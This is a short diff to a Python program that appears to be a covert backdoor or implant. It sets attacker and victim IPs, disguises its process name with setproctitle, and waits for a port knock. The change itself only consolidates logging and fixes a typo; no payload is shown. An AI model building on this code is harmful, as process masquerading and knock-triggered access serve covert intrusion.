@@ -1,6 +1,5 @@
 import signal
 import sys
-import socket
 import subprocess
 import threading
 
@@ -126,14 +125,13 @@ def main():
     args = build_parser().parse_args()
     my_ip = get_ip_address(args.iface)
 
-    print(f'setting interface to: {args.iface}')
     Cfg.IFACE = args.iface
-    print(f'setting attackerip to: {args.ip}')
     Cfg.ATTACKER_IP = args.ip
-    print(f'setting victimip to: {my_ip}')
     Cfg.VICTIM_IP = my_ip
 
-    print(f'settings program name to: {args.name}')
+    print('config: ' + ', '.join('%s: %s' % item for item in vars(Cfg).items() if not item[0].startswith('__')))
+
+    print(f'setting program name to: {args.name}')
     setproctitle(args.name)
 
     wait_for_knock()
